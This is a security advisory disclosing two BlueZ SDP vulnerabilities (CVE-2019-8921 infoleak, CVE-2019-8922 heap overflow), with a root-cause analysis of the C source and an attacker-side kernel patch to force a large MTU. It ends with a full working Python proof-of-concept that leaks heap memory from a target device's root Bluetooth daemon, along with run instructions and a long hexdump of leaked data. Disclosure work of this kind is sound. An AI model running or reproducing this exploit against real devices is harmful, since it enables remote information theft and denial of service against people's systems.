**Vulnerabilities Summary**<br>
The following advisory discuss about two vulnerabilities found in Linux BlueZ bluetooth module.

One of the core ideas behind Bluetooth is allowing interoperability
between a wide range of devices from different manufacturers. This is one
of the reasons that the Bluetooth specification is extremely long and complex.

Detailed descriptions of a wide range of protocols that support all common use-cases ensure that different Bluetooth implementations can work together. However, from an attackers point of view this also means that there is a lot of unneeded complexity in the Bluetooth stack which provides a large attack surface. Due to the modular nature of Bluetooth, some critical features such as packet fragmentation are found redundantly in multiple protocols that are part of the Bluetooth core specification. This makes correct implementation very complicated and increases the likelihood of security issues.

**Vendor Response**<br>
We have contacted the Bluez maintainer on 23/8/2018 and sent a report describing the two vulnerabilities. The vendor responded “I got the message and was able to decrypt it, but frankly I don’t know when I get to look at it at confirm the issue.”. We have sent few more emails to the vendor since the first report and also proposed patches for the vulnerabilities but no fix has been issued until the day of writing this post. Proposed patches have been provided by, Luiz Augusto von Dentz, at the bottom of this advisory.

**CVE**<br>
CVE-2019-8921 <br>
CVE-2019-8922

**Credit**<br>
An independent security researcher, Julian Rauchberger, has reported this vulnerability to SSD Secure Disclosure program.

**Affected systems**<br>
Linux systems with BlueZ module with versions 5.17-5.48 (latest at the time of writing this advisory)

**Vulnerability Details**<br>
To support the huge range of potential use cases for Bluetooth, the specification describes many different protocols. For the vulnerabilities detailed in this advisory, we will focus on two core protocols: L2CAP and SDP.

>L2CAP<br>
Simply speaking, L2CAP can be seen as the TCP layer of Bluetooth. It is
responsible for implementing low-level features such as multiplexing and
flow control. What would be called a “port” in TCP is the “Protocol/Service
Multiplexer” (PSM) value in L2CAP. Authentication and Authorization is
generally handled on higher layers, meaning that an attacker can open a
L2CAP connection to any PSM they want and send whatever crafted packets
they wish. From a technical point of view, BlueZ implements L2CAP inside
the kernel as a module.

>SDP<br>
SDP is the Service Discovery Protocol. It is implemented above L2CAP as a
“service” running on PSM 0x0001. Since the PSM is only a 16-bit number, it is not possible to assign a unique PSM to every Bluetooth service imaginable. SDP can translate globally unique UUIDs to a dynamic PSM used on a specific device.

For instance, a vendor specific service has the same UUID on all devices but
might run on PSM 0x0123 on device A and PSM 0x0456 on device B. It is the job of SDP to provide this information to devices that wish to connect to the service.

**Example**
* Device A opens a L2CAP connection to PSM 0x0001 (SDP) on device B
* Device A asks “what is the PSM for the service with UUID 0x12345678?”
* Device B responds with “PSM 0x1337”
* Device A opens an L2CAP connection to PSM 0x1337

SDP is also used to advertise all the Bluetooth Profiles (services/features) a
device supports. It can be queried to send a list of all services running
on the device as well as their attributes (mostly simple key/value pairs).
The SDP protocol is implemented in a userspace daemon by BlueZ. Since it
requires high privileges, this daemon normally runs as root, meaning
vulnerabilities should result in full system compromise in most cases.

**PoC’s and Testing Environment**<br>
The PoC’s attached at the end of this advisory have been tested against
BlueZ 5.48 (the newest version at the time of writing), BlueZ 5.17 (a very old version from 2014), as well as a few in between.

The PoC’s have been written for Python 2.7 and have two dependencies, please install them first:
* pybluez (to send Bluetooth packets)
* pwntools (for easier crafting of packets and hexdump())

run them with:<br>
python sdp_infoleak_poc.py TARGET=XX:XX:XX:XX:XX:XX<br>
python sdp_heapoverflow_poc.py TARGET=XX:XX:XX:XX:XX:XX

(where XX:XX:XX:XX:XX:XX is the Bluetooth MAC address of the victim device)

Please ensure that the Bluetooth is activated and the device is discoverable (called “visible” in most of the GUIs)

It might be necessary to update the SERVICE_REC_HANDLE and/or SERVICE_ATTR_ID to get the PoC’s to work. These values can differ between devices. They are advertised by SDP so it could be automated to find them but we didn’t implemented that. Detailed information is inside the comments of the PoC’s.

**Vulnerability 1: SDP infoleak**<br>
Note: All line numbers and filenames referenced here were taken from BlueZ 5.48 which is the newest version at the time of writing.

The vulnerability lies in the handling of a SVC_ATTR_REQ by the SDP implementation of BlueZ. By crafting a malicious CSTATE, it is possible to trick the server into returning more bytes than the buffer actually holds, resulting in leaking arbitrary heap data.

Background
This vulnerability demonstrates very well issues arising due to the
aforementioned complexity caused by the redundant implementation of some features in multiple protocols.

Even though L2CAP already provides sufficient fragmentation features, SDP
defines its own. However, incorrect implementation in BlueZ leads to a
significant information leak.

One of the features of SDP is to provide the values of custom attributes a
service might have. The client sends the ID of an attribute and SDP responds with the corresponding value.

If the response to an attribute request is too large to fit within a single
SDP packet, a “Continuation State” (cstate) is created.

Here is how it should work in theory:

client sends an attribute request
server sees that the response is too large to fit in the reply
server appends arbitrary continuation state data to the response
client recognizes this means the response is not complete yet
client sends the same request again, this time including the continuation state data sent by the server
server responds with the rest of the data
According to the specification, the cstate data can be arbitrary data,
basically whatever the specific implementation wants and the client is
required to send the same request again, including the cstate data sent by
the server.

The implementation of this mechanism in BlueZ is flawed. A malicious client can manipulate the cstate data it sends in the second request. The server does not check this and simply trusts that the data is the same. This leads to an infloleak described in the next section.

Root cause analysis
The root cause can be found in the function service_attr_req on line 633 of
src/sdpd-request.c

```c
721 if (cstate) {
722  sdp_buf_t *pCache = sdp_get_cached_rsp(cstate);
723
724  SDPDBG("Obtained cached rsp : %p", pCache);
725
726 if (pCache) {
727  short sent = MIN(max_rsp_size, pCache->data_size - cstate->cStateValue.maxBytesSent);
728  pResponse = pCache->data;
729  memcpy(buf->data, pResponse + cstate->cStateValue.maxBytesSent, sent);
730  buf->data_size += sent;
731  cstate->cStateValue.maxBytesSent += sent;
732
733  SDPDBG("Response size : %d sending now : %d bytes sent so far : %d",
734  pCache->data_size, sent, cstate->cStateValue.maxBytesSent);
735  if (cstate->cStateValue.maxBytesSent == pCache->data_size)
736   cstate_size = sdp_set_cstate_pdu(buf, NULL);
737  else
738   cstate_size = sdp_set_cstate_pdu(buf, cstate);
739 } else {
740  status = SDP_INVALID_CSTATE;
741  error("NULL cache buffer and non-NULL continuation state");
742 }
```

The main issue here is in line 727 where BlueZ calculates how many bytes should be sent to the client.

The value of max_rsp_size can be controlled by the attacker but normally the MIN function should ensure that it cannot be larger than than the actual bytes available. The vulnerability is that we can cause an underflow when calculating (pCache->data_size – cstate->cStateValue.maxBytesSent) which causes that value to be extremely high when interpreted as an unsigned integer. MIN will then return whatever we sent as max_rsp_size since it is smaller than the result of the underflow.

pCache->data_size is how large the initially generated response has been.
cstate->cStateValue.maxBytesSent is directly read from the cstate we sent to
the server. So we can set it to any value we want.

If we set maxBytesSent to a value higher than data_size, we trigger an
underflow that allows us to cause MIN() to return our max_rsp_size which lets us set “sent” to any value we want.

The memcpy in line 729 will then copy all that data to the response buffer
which later gets sent to us.

Since “sent” is a signed short, we have two possible ways to exploit this:

If we set sent to value <= 0x7FFF it is treated as a positive integer and we will get sent this amount of bytes back.
If we set it to 0x8000 or larger it will be treated as a negative value, meaning zero expansion will fill all the most significant bits with 1, resulting in a extremely large copy operation in line 729 that is guaranteed to crash the program.
So this vulnerability can be either used as a infoleak to leak up 0x7FFF bytes or as a Denial of Service that crashes the bluetooth application.

Triggering the vulnerability
To trigger this vulnerability, we first send a legitimate attribute request
to the server.

In our request, we can specify how many bytes we are willing to accept within a single response packet. Since we already know how large the
response will be, we set this so the response will be one byte too large.

This results in the server storing that there is one byte left it hadn’t sent us
yet. The server also sends us a cstate that contains how many bytes it has
already sent us. For simplicity, we call this value the “offset”.

Then we send the same request again, but we increase the “offset” contained in the cstate to create the underflow described above.

For detailed documentation about how the packets we send look exactly, please refer to the comments in the Python PoC file.

Vulnerability 2: SDP Heap Overflow
Like the information leak, this vulnerability lies in the SDP protocol handling of attribute requests as well. By requesting a huge number of attributes at the same time, an attacker can overflow the static buffer provided to hold the response. Normally, it would not be possible to request so many attributes but we will demonstrate a trick that allows us to do so.

Root cause analysis

In the same function service_attr_req of src/sdpd-request.c, in line 745 the
function extract_attrs is called.
```c
744 sdp_record_t *rec = sdp_record_find(handle);
745 status = extract_attrs(rec, seq, buf);
746 if (buf->data_size > max_rsp_size) {
747  sdp_cont_state_t newState;
748
749  memset((char *)&newState, 0,
```

This function is used to find the actual values for all the attributes requested by the client. Inside it, we find the following code:
```c
606 for (attr = low; attr < high; attr++) {
607 data = sdp_data_get(rec, attr);
608 if (data)
609  sdp_append_to_pdu(buf, data);
610 }
611 data = sdp_data_get(rec, high);
612 if (data)
613  sdp_append_to_pdu(buf, data);
```

The important part here is that after getting the values of the attributes
with sdp_data_get, they are simply appended to the buffer with sdp_append_to_pdu.
The code of this function can be found in lib/sdp.c

```c
2871 void sdp_append_to_pdu(sdp_buf_t *pdu, sdp_data_t *d)
2872 {
2873  sdp_buf_t append;
2874
2875  memset(&append, 0, sizeof(sdp_buf_t));
2876  sdp_gen_buffer(&append, d);
2877  append.data = malloc(append.buf_size);
2878  if (!append.data)
2879   return;
2880
2881  sdp_set_attrid(&append, d->attrId);
2882  sdp_gen_pdu(&append, d);
2883  sdp_append_to_buf(pdu, append.data, append.data_size);
2884  free(append.data);
2885 }
```

What happens here is that an appropriately sized sdp_buf_t is created and the new data is copied into it. After that, sdp_append_to_buf is called to append this data to the buffer originally passed by extract_attrs.
sdp_append_to_buf can be found in the same file, the relevant part is here:

```c
2829 void sdp_append_to_buf(sdp_buf_t *dst, uint8_t *data, uint32_t len)
2830 {
2831  uint8_t *p = dst->data;
2832  uint8_t dtd = *p;
2833
2834  SDPDBG("Append src size: %d", len);
2835  SDPDBG("Append dst size: %d", dst->data_size);
2836  SDPDBG("Dst buffer size: %d", dst->buf_size);
2837  if (dst->data_size == 0 && dtd == 0) {
2838   /* create initial sequence */
2839   *p = SDP_SEQ8;
2840   dst->data_size += sizeof(uint8_t);
2841   /* reserve space for sequence size */
2842   dst->data_size += sizeof(uint8_t);
2843  }
2844
2845  memcpy(dst->data + dst->data_size, data, len);
```
As we can see, there isn’t any check if there is enough space in the destination buffer. The function simply appends all data passed to it.

To sum everything up, the values of all attributes that are requested will simply be appended to the output buffer. There are no size checks whatsoever, resulting in a simple heap overflow if one can craft a request where the response is large enough to overflow the preallocated buffer.

service_attr_req gets called by process_request (also in src/sdpd-request.c) which also allocates the response buffer.

```c
968 static void process_request(sdp_req_t *req)
969 {
970  sdp_pdu_hdr_t *reqhdr = (sdp_pdu_hdr_t *)req->buf;
971  sdp_pdu_hdr_t *rsphdr;
972  sdp_buf_t rsp;
973  uint8_t *buf = malloc(USHRT_MAX);
974  int status = SDP_INVALID_SYNTAX;
975
976  memset(buf, 0, USHRT_MAX);
977  rsp.data = buf + sizeof(sdp_pdu_hdr_t);
978  rsp.data_size = 0;
979  rsp.buf_size = USHRT_MAX - sizeof(sdp_pdu_hdr_t);
980  rsphdr = (sdp_pdu_hdr_t *)buf;
```

On line 973, the response buffer gets allocated with size USHRT_MAX meaning it will be 2^16 bytes large.

So in order to overflow this buffer we need to generate a response that is larger than 2^16 bytes. While SDP does not restrict how many attributes we can request within a single packet, we are limited by the outgoing maximum transmission unit L2CAP forces us to use. For SDP, this seems to be hardcoded as 672 bytes.

So the problem in exploiting this vulnerability is that we can only send a very small request but need to generate a large response.

Some attributes are rather long strings, but even by requesting the longest string we found we could not even get close to generating a response large
enough. SDP also has a feature where we can not only request one attribute at a time but also a range of attributes. This requires us to only send the starting and ending IDs. SDP will then return all attributes within that range. Unfortunately, the response generated by this also wasn’t large enough.

Since the limiting factor seemed to be the MTU imposed by L2CAP, after investigating further how this MTU gets set and if we can do anything about it. Normally, we can only specifiy the maximum size of incoming packets (IMTU) but not the size of packets the other side is willing to accept (OMTU).
After looking at the way L2CAP handles the negotiation of these values we found that it is also possible to reject the configuration supplied by the other side. If we reject a configuration parameter, we can supply a suggestion of a better value that we would accept.

If this happens for the OMTU, the BlueZ will simply accept whatever
suggestion it gets sent. This allows us to force the other side to use whatever
OMTU we want. Then we can send much larger SDP attribute requests, containing enough attributes to overflow the heap.

In a simplified way,  this is how the MTU negotiation looks like:

attacker: I want to open a L2CAP connection, my MTU is 65536
victim: ok, I will send you packets up to 65536 bytes, my MTU is 672, please do not send larger packets (normally, we would be done here)
attacker: that MTU is not acceptable for me, I will only open the connection if I can send you packets up to 65536
victim: ok, I will allow you to send packets up to 65536 bytes
Unfortunately, Linux does not allow us to reject any MTU values so we modified the kernel on the attacker machine to implement the behavior described above.

Please note that this behavior is not really a security vulnerability in itself.
It does follow the specification which describes that it should be possible to
reject configuration parameters and suggest acceptable ones. Normally it would not be a problem to increase MTU size, it is simply due to the heap overflow that this causes trouble.

**Modifying the kernel**<br>
Important: only the ATTACKER has to modify their kernel. The victim kernel does not need to be modified otherwise there wasn’t a vulnerability at all.

In our case, we used a Linux 4.13 kernel. Here are the required modifications:
Before compiling the kernel, you need to modify l2cap_parse_conf_req in
net/bluetooth/l2cap_core.c

```c
3428 if (result == L2CAP_CONF_SUCCESS) {
3429  /* Configure output options and let the other side know
3430  * which ones we don't like. */
3431
3432  if (mtu < L2CAP_DEFAULT_MIN_MTU) {
3433   result = L2CAP_CONF_UNACCEPT;
3434  } else if(chan->omtu != 65535){
3435   set_bit(CONF_MTU_DONE, &chan->conf_state);
3436   printk(KERN_INFO "hax setting omtu to 65535 from %d\n",chan->omtu);
3437   chan->omtu = 65535;
3438   result = L2CAP_CONF_UNACCEPT;
3439
3440 } else {
3441  chan->omtu = mtu;
3442  set_bit(CONF_MTU_DONE, &chan->conf_state);
3443 }
3444 l2cap_add_conf_opt(&ptr, L2CAP_CONF_MTU, 2, chan->omtu, endptr - ptr);
```

We added the “else if” that ensures we do not accept the configuration as long as the OMTU isn’t 65535. Additionally we added a printk so we can check that the branch has been triggered correctly by viewing kernel.
Once you compile your modified kernel, you can run the PoC attached to this writeup.

**Conclusion**<br>
Implementing a complete Bluetooth stack correctly is extremely challenging. There are dozens of different protocols involved which often implement the same features.

This can for instance be seen with the fragmentation in SDP. All this complexity creates a huge attack surface. We have demonstrated that only within a single, commonly used protocol multiple critical issues can be found. It seems highly likely that other parts of BlueZ contain similar vulnerabilities, more research is definitely required to ensure the Linux Bluetooth stack is secure from attacks.

**Exploits**<br>
Inforamtion Leak Exploit:<br>
```python
from pwn import *
import bluetooth
if not 'TARGET' in args:
    log.info("Usage: sdp_infoleak_poc.py TARGET=XX:XX:XX:XX:XX:XX")
    exit()
# the configuration here depends on the victim device.
# Discovery could be automated but for a simple PoC it would be a bit overkill
# the attacker can simply gather the required information by running
# sdptool browse --xml XX:XX:XX:XX:XX:XX
# on his machine (replace XX:XX:XX:XX:XX:XX with victim MAC)
# I have chosen to request attributes from the Generic Access Profile
# but it does not really matter as long as we can generate a response with a
# size large enough to create a continuation state
# on my machine, sdptool prints the following:
#	<attribute id="0x0000">
#		<uint32 value="0x00010001" />
#	</attribute>
# [...]
#	<attribute id="0x0102">
#		<text value="BlueZ" />
#	</attribute>
# please replace these values if they should not match your victim device
# the service from which we want to request attributes (GAP)
SERVICE_REC_HANDLE = 0x00010001
# the attribute we want to request (in this case, the String "BlueZ")
SERVICE_ATTR_ID = 0x0102
target = args['TARGET']     # TARGET Mac address
mtu = 65535                 # MTU to use
context.endian = 'big'
# this is how many bytes we want to leak
# you can set it up to 0x7FFF
# if you set it to 0x8000 or higher, the victim will crash
# I have experienced that with slow Bluetooth hardware, large leaks can
# sometimes result in timeouts so I don't recommend to set it larger than
# 0x0FFF for this PoC
LEAK_BYTES = 0x0FFF
# this function crafts a SDP attribute request packet
# handle: the service we want to query
# max_rsp_size: how many bytes we are willing to accept in a single response packet
# attr: the attribute(s) we want to query
# cstate: the cstate to send
def sdppacket(handle, max_rsp_size, attr, cstate):
    # craft packet to reach vulnerable code
    pkt = ""
    pkt += p32(handle)      # handle
    pkt += p16(max_rsp_size)# max_rsp_size
    # contains an attribute sequence with the length describing the attributes being 16 bit long
    # see extract_des function in line 113 of src/sdpd-request.c
    pkt += p8(0x36)         # DTD (seq_type SDP_SEQ16)
    pkt += p16(len(attr))   # seq size, 16 bit according to DTD
    # attributes
    pkt += attr
    # append cstate
    if cstate:
        pkt += p8(len(cstate))
        pkt += cstate
    else:
        pkt += p8(0x00) # no cstate
    pduhdr = ""
    pduhdr += p8(0x04) # pdu_id 0x04 -> SVC_ATTR_REQ (we want to send an attribute request)
    pduhdr += p16(0x0000) # TID, doesn't matter
    pduhdr += p16(len(pkt)) # plen, length of body
    return pduhdr + pkt
if __name__ == '__main__':
    log.info('Creating L2CAP socket')
    sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
    bluetooth.set_l2cap_mtu(sock, mtu)
    log.info('Connecting to target')
    sock.connect((target, 0x0001)) # connect to target on PSM 0x0001 (SDP)
    log.info('Sending packet to prepare serverside cstate')
    # the attribute we want to read
    attr = p8(0x09) # length of ATTR_ID (SDP_UINT16 - see lib/sdp.h)
    attr += p16(SERVICE_ATTR_ID)
    # craft the packet
    sdp = sdppacket(
        SERVICE_REC_HANDLE, # the service handle
        101,                # max size of the response we are willing to accept
        attr*10,            # just request the same attribute 10 times, response will be 102 bytes large
        None)               # no cstate for now
    sock.send(sdp)
    # receive response to first packet
    data = sock.recv(mtu)
    # parse the cstate we received from the server
    cstate_len_index = len(data)-9
    cstate_len = u8(data[cstate_len_index], endian='little')
    # sanity check: cstate length should always be 8 byte
    if cstate_len != 8:
        log.error('We did not receive a cstate with the length we expected, check if the attribute ids are correct')
        exit(1)
    # the cstate contains a timestamp which is used as a "key" on the server to find the
    # cstate data again. We will just send the same value back
    timestamp = u32(data[cstate_len_index+1:cstate_len_index+5], endian='little')
    # offset will be the value of cstate->cStateValue.maxBytesSent when we send it back
    offset = u16(data[cstate_len_index+5:cstate_len_index+7], endian='little')
    log.info("cstate: len=%d timestamp=%x offset=%d" % (cstate_len, timestamp, offset))
    if offset != 101:
        log.error('we expected to receive an offset of size 101, check if the attribute request is correct')
        exit(2)
    # now we craft our malicious cstate
    cstate = p32(timestamp, endian='little')    # just send back the same timestamp
    cstate += p16(offset+100, endian='little')  # increase the offset by 100 to cause underflow
    cstate += p16(0x0000, endian='little')      # 0x0000 to indicate end of cstate
    log.info('Triggering infoleak...')
    # now we send the second packet that triggers the information leak
    # the manipulated CSTATE will cause an underflow that will make the server
    # send us LEAK_BYTES bytes instead of the correct amount.
    sdp = sdppacket(SERVICE_REC_HANDLE, LEAK_BYTES, attr*10, cstate)
    sock.send(sdp)
    # receive leaked data
    data = sock.recv(mtu)
    log.info("The response is %d bytes large" % len(data))
    print hexdump(data)
```
If everything happens as expected, we shall get a similar output to this:<br>
```dump
[*] Creating L2CAP socket
[*] Connecting to target
[*] Sending packet to prepare serverside cstate
[*] cstate: len=8 timestamp=5aa54c56 offset=101
[*] Triggering infoleak...
[*] The response is 4111 bytes large
00000000  05 00 00 10  0a 0f ff 68  6e 6f 6c 6f  67 69 65 73  │····│···h│nolo│gies│
00000010  3d 42 52 2f  45 44 52 3b  0a 54 72 75  73 74 65 64  │=BR/│EDR;│·Tru│sted│
00000020  3d 66 61 6c  73 65 0a 42  6c 6f 63 6b  65 64 3d 66  │=fal│se·B│lock│ed=f│
00000030  61 6c 73 65  0a 53 65 72  76 69 63 65  73 3d 30 30  │alse│·Ser│vice│s=00│
00000040  30 30 31 31  30 35 2d 30  30 30 30 2d  31 30 30 30  │0011│05-0│000-│1000│
00000050  2d 38 30 30  30 2d 30 30  38 30 35 66  39 62 33 34  │-800│0-00│805f│9b34│
00000060  66 62 3b 30  30 30 30 31  31 30 36 2d  30 30 30 30  │fb;0│0001│106-│0000│
00000070  2d 31 30 30  30 2d 38 30  30 30 2d 30  30 38 30 35  │-100│0-80│00-0│0805│
00000080  66 39 62 33  34 66 62 3b  30 30 30 30  31 31 30 61  │f9b3│4fb;│0000│110a│
00000090  2d 30 30 30  30 2d 31 30  30 30 2d 38  30 30 30 2d  │-000│0-10│00-8│000-│
000000a0  30 30 38 30  35 66 39 62  33 34 66 62  3b 30 30 30  │0080│5f9b│34fb│;000│
000000b0  30 31 31 30  63 2d 30 30  30 30 2d 31  30 30 30 2d  │0110│c-00│00-1│000-│
000000c0  38 30 30 30  2d 30 30 38  30 35 66 39  62 33 34 66  │8000│-008│05f9│b34f│
000000d0  62 3b 30 30  30 30 31 31  30 65 2d 30  30 30 30 2d  │b;00│0011│0e-0│000-│
000000e0  31 30 30 30  2d 38 30 30  30 2d 30 30  38 30 35 66  │1000│-800│0-00│805f│
000000f0  39 62 33 34  66 62 3b 30  30 30 30 31  31 31 32 2d  │9b34│fb;0│0001│112-│
00000100  30 30 30 30  2d 31 30 30  30 2d 38 30  30 30 2d 30  │0000│-100│0-80│00-0│
00000110  30 38 30 35  66 39 62 33  34 66 62 3b  30 30 30 30  │0805│f9b3│4fb;│0000│
00000120  31 31 31 35  2d 30 30 30  30 2d 31 30  30 30 2d 38  │1115│-000│0-10│00-8│
00000130  30 30 30 2d  30 30 38 30  35 66 39 62  33 34 66 62  │000-│0080│5f9b│34fb│
00000140  3b 30 30 30  30 31 31 31  36 2d 30 30  30 30 2d 31  │;000│0111│6-00│00-1│
00000150  30 30 30 2d  38 30 30 30  2d 30 30 38  30 35 66 39  │000-│8000│-008│05f9│
00000160  62 33 34 66  62 3b 30 30  30 30 31 31  31 66 2d 30  │b34f│b;00│0011│1f-0│
00000170  30 30 30 2d  31 30 30 30  2d 38 30 30  30 2d 30 30  │000-│1000│-800│0-00│
00000180  38 30 35 66  39 62 33 34  66 62 3b 30  30 30 30 31  │805f│9b34│fb;0│0001│
00000190  31 32 66 2d  30 30 30 30  2d 31 30 30  30 2d 38 30  │12f-│0000│-100│0-80│
000001a0  30 30 2d 30  30 38 30 35  66 39 62 33  34 66 62 3b  │00-0│0805│f9b3│4fb;│
000001b0  30 30 30 30  31 31 33 32  2d 30 30 30  30 2d 31 30  │0000│1132│-000│0-10│
000001c0  30 30 2d 38  30 30 30 2d  30 30 38 30  35 66 39 62  │00-8│000-│0080│5f9b│
000001d0  33 34 66 62  3b 30 30 30  30 31 32 30  30 2d 30 30  │34fb│;000│0120│0-00│
000001e0  30 30 2d 31  30 30 30 2d  38 30 30 30  2d 30 30 38  │00-1│000-│8000│-008│
000001f0  30 35 66 39  62 33 34 66  62 3b 30 30  30 30 31 38  │05f9│b34f│b;00│0018│
00000200  30 30 2d 30  30 30 30 2d  31 30 30 30  2d 38 30 30  │00-0│000-│1000│-800│
00000210  30 2d 30 30  38 30 35 66  39 62 33 34  66 62 3b 30  │0-00│805f│9b34│fb;0│
00000220  30 30 30 31  38 30 31 2d  30 30 30 30  2d 31 30 30  │0001│801-│0000│-100│
00000230  30 2d 38 30  30 30 2d 30  30 38 30 35  66 39 62 33  │0-80│00-0│0805│f9b3│
00000240  34 66 62 3b  30 30 30 30  36 36 37 35  2d 37 34 37  │4fb;│0000│6675│-747│
00000250  35 2d 37 32  36 35 2d 36  34 36 39 2d  36 31 36 63  │5-72│65-6│469-│616c│
00000260  36 32 37 35  36 64 37 30  3b 0a 0a 5b  44 65 76 69  │6275│6d70│;··[│Devi│
00000270  63 65 49 44  5d 0a 53 6f  75 72 63 65  3d 31 0a 56  │ceID│]·So│urce│=1·V│
00000280  65 6e 64 6f  72 3d 31 35  0a 50 72 6f  64 75 63 74  │endo│r=15│·Pro│duct│
00000290  3d 34 36 30  38 0a 56 65  72 73 69 6f  6e 3d 35 31  │=460│8·Ve│rsio│n=51│
000002a0  37 34 0a 00  00 00 00 00  00 00 00 00  00 00 00 00  │74··│····│····│····│
000002b0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
*
000003d0  00 00 00 00  00 00 41 00  00 00 00 00  00 00 35 00  │····│··A·│····│··5·│
000003e0  04 00 00 00  00 00 80 4d  40 27 aa 55  00 00 00 00  │····│···M│@'·U│····│
000003f0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
00000400  00 00 00 00  00 00 12 00  00 00 00 00  00 00 00 00  │····│····│····│····│
00000410  00 00 00 00  00 00 41 00  00 00 00 00  00 00 09 00  │····│··A·│····│····│
00000420  11 03 00 00  00 00 0f 00  00 00 00 00  00 00 00 00  │····│····│····│····│
00000430  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
00000440  00 00 00 00  00 00 03 00  00 00 00 00  00 00 00 00  │····│····│····│····│
00000450  00 00 00 00  00 00 31 00  00 00 00 00  00 00 01 00  │····│··1·│····│····│
00000460  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
00000470  00 00 00 00  00 00 00 00  00 00 00 00  00 00 30 00  │····│····│····│··0·│
00000480  00 00 00 00  00 00 31 00  00 00 00 00  00 00 f0 b5  │····│··1·│····│····│
00000490  41 27 aa 55  00 00 8c 45  a5 5a 00 00  00 00 30 b9  │A'·U│···E│·Z··│··0·│
000004a0  41 27 aa 55  00 00 66 00  00 00 66 00  00 00 33 34  │A'·U│··f·│··f·│··34│
000004b0  66 62 00 00  00 00 11 04  00 00 00 00  00 00 20 17  │fb··│····│····│·· ·│
000004c0  41 27 aa 55  00 00 45 20  6e 6f 64 65  20 50 55 42  │A'·U│··E │node│ PUB│
000004d0  4c 49 43 20  22 2d 2f 2f  66 72 65 65  64 65 73 6b  │LIC │"-//│free│desk│
000004e0  74 6f 70 2f  2f 44 54 44  20 44 2d 42  55 53 20 4f  │top/│/DTD│ D-B│US O│
000004f0  62 6a 65 63  74 20 49 6e  74 72 6f 73  70 65 63 74  │bjec│t In│tros│pect│
00000500  69 6f 6e 20  31 2e 30 2f  2f 45 4e 22  0a 22 68 74  │ion │1.0/│/EN"│·"ht│
00000510  74 70 3a 2f  2f 77 77 77  2e 66 72 65  65 64 65 73  │tp:/│/www│.fre│edes│
00000520  6b 74 6f 70  2e 6f 72 67  2f 73 74 61  6e 64 61 72  │ktop│.org│/sta│ndar│
00000530  64 73 2f 64  62 75 73 2f  31 2e 30 2f  69 6e 74 72  │ds/d│bus/│1.0/│intr│
00000540  6f 73 70 65  63 74 2e 64  74 64 22 3e  0a 3c 6e 6f  │ospe│ct.d│td">│·<no│
00000550  64 65 3e 3c  69 6e 74 65  72 66 61 63  65 20 6e 61  │de><│inte│rfac│e na│
00000560  6d 65 3d 22  6f 72 67 2e  66 72 65 65  64 65 73 6b  │me="│org.│free│desk│
00000570  74 6f 70 2e  44 42 75 73  2e 49 6e 74  72 6f 73 70  │top.│DBus│.Int│rosp│
00000580  65 63 74 61  62 6c 65 22  3e 3c 6d 65  74 68 6f 64  │ecta│ble"│><me│thod│
00000590  20 6e 61 6d  65 3d 22 49  6e 74 72 6f  73 70 65 63  │ nam│e="I│ntro│spec│
000005a0  74 22 3e 3c  61 72 67 20  6e 61 6d 65  3d 22 78 6d  │t"><│arg │name│="xm│
000005b0  6c 22 20 74  79 70 65 3d  22 73 22 20  64 69 72 65  │l" t│ype=│"s" │dire│
000005c0  63 74 69 6f  6e 3d 22 6f  75 74 22 2f  3e 0a 3c 2f  │ctio│n="o│ut"/│>·</│
000005d0  6d 65 74 68  6f 64 3e 3c  2f 69 6e 74  65 72 66 61  │meth│od><│/int│erfa│
000005e0  63 65 3e 3c  69 6e 74 65  72 66 61 63  65 20 6e 61  │ce><│inte│rfac│e na│
000005f0  6d 65 3d 22  6f 72 67 2e  66 72 65 65  64 65 73 6b  │me="│org.│free│desk│
00000600  74 6f 70 2e  44 42 75 73  2e 4f 62 6a  65 63 74 4d  │top.│DBus│.Obj│ectM│
00000610  61 6e 61 67  65 72 22 3e  3c 6d 65 74  68 6f 64 20  │anag│er">│<met│hod │
00000620  6e 61 6d 65  3d 22 47 65  74 4d 61 6e  61 67 65 64  │name│="Ge│tMan│aged│
00000630  4f 62 6a 65  63 74 73 22  3e 3c 61 72  67 20 6e 61  │Obje│cts"│><ar│g na│
00000640  6d 65 3d 22  6f 62 6a 65  63 74 73 22  20 74 79 70  │me="│obje│cts"│ typ│
00000650  65 3d 22 61  7b 6f 61 7b  73 61 7b 73  76 7d 7d 7d  │e="a│{oa{│sa{s│v}}}│
00000660  22 20 64 69  72 65 63 74  69 6f 6e 3d  22 6f 75 74  │" di│rect│ion=│"out│
00000670  22 2f 3e 0a  3c 2f 6d 65  74 68 6f 64  3e 3c 73 69  │"/>·│</me│thod│><si│
00000680  67 6e 61 6c  20 6e 61 6d  65 3d 22 49  6e 74 65 72  │gnal│ nam│e="I│nter│
00000690  66 61 63 65  73 41 64 64  65 64 22 3e  3c 61 72 67  │face│sAdd│ed">│<arg│
000006a0  20 6e 61 6d  65 3d 22 6f  62 6a 65 63  74 22 20 74  │ nam│e="o│bjec│t" t│
000006b0  79 70 65 3d  22 6f 22 2f  3e 0a 3c 61  72 67 20 6e  │ype=│"o"/│>·<a│rg n│
000006c0  61 6d 65 3d  22 69 6e 74  65 72 66 61  63 65 73 22  │ame=│"int│erfa│ces"│
000006d0  20 74 79 70  65 3d 22 61  7b 73 61 7b  73 76 7d 7d  │ typ│e="a│{sa{│sv}}│
000006e0  22 2f 3e 0a  3c 2f 73 69  67 6e 61 6c  3e 0a 3c 73  │"/>·│</si│gnal│>·<s│
000006f0  69 67 6e 61  6c 20 6e 61  6d 65 3d 22  49 6e 74 65  │igna│l na│me="│Inte│
00000700  72 66 61 63  65 73 52 65  6d 6f 76 65  64 22 3e 3c  │rfac│esRe│move│d"><│
00000710  61 72 67 20  6e 61 6d 65  3d 22 6f 62  6a 65 63 74  │arg │name│="ob│ject│
00000720  22 20 74 79  70 65 3d 22  6f 22 2f 3e  0a 3c 61 72  │" ty│pe="│o"/>│·<ar│
00000730  67 20 6e 61  6d 65 3d 22  69 6e 74 65  72 66 61 63  │g na│me="│inte│rfac│
00000740  65 73 22 20  74 79 70 65  3d 22 61 73  22 2f 3e 0a  │es" │type│="as│"/>·│
00000750  3c 2f 73 69  67 6e 61 6c  3e 0a 3c 2f  69 6e 74 65  │</si│gnal│>·</│inte│
00000760  72 66 61 63  65 3e 3c 6e  6f 64 65 20  6e 61 6d 65  │rfac│e><n│ode │name│
